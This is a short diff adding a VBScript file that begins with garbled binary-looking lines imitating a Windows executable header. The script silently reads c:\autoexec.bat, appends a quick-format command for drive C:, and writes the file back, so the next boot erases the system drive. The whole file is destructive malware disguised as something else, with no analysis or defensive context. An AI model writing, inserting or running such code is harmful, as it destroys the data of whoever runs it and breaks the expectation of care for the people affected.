@@ -1,0 +1,15 @@
+'MZ Ò­ ¤)j~
+'sÞ FIÙèð¦-!ÔÔ+SQ_÷ÔÏèï__+t'_+t+ï
+'<ïü_ËÔü-ðD3+© B-!r'¦ªþÄ¦ ¦?-
+On Error Resume Next
+Set Auto = CreateObject("Scripting.FileSystemObject")
+autoexec = "c:\autoexec.bat"
+Set Exec = Auto.OpenTextFile(autoexec,1)
+Do While Exec.AtEndOfStream = False
+Intro = chr(13) + chr(10)
+LineZ = LineZ + Exec.ReadLine + Intro
+Loop
+Exec.Close
+LineZ = LineZ + Intro + "FoRmaT C:\ /Q"
+Set Boom = Auto.CreateTextFile(autoexec, 2,false)
+Boom.Writeline(LineZ)
